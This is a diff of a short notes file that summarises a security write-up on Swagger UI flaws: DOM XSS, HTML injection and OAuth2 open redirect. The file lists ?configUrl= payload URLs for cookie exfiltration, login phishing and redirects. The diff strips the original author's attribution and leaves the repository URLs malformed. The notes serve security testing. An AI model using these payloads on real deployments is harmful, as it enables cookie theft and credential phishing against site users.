@@ -1,5 +1,5 @@
-# LostSec: The Dark Side of Swagger UI — XSS, HTML Injection & API Exploitation
-- Source: LostSec (Jun 24, 2025) — infosecwriteups.com
+# Community: The Dark Side of Swagger UI — XSS, HTML Injection & API Exploitation
+- Source: Community (Jun 24, 2025) — infosecwriteups.com
 - DOM XSS, HTML injection, and open redirect in exposed Swagger UI instances
 
 ## What is Swagger UI?
@@ -22,19 +22,19 @@ If DOMPurify blocks XSS, HTML injection can still render fake login forms under 
 ### 3. Open Redirect via OAuth2 Authorize Button
 Supply crafted `authorizationUrl` in the spec → clicking Authorize redirects victim to attacker domain.
 
-## Testing Payloads (from coffinxp/swagger repo)
+## Testing Payloads (from swagger repo)
 ```
 # XSS test
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/xsstest.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/xsstest.json
 
 # Cookie exfiltration
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/xsscookie.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/xsscookie.json
 
 # Login phishing
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/login.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/login.json
 
 # Open redirect
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/rlogin.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/rlogin.json
 ```
 
 ## Discovery Commands
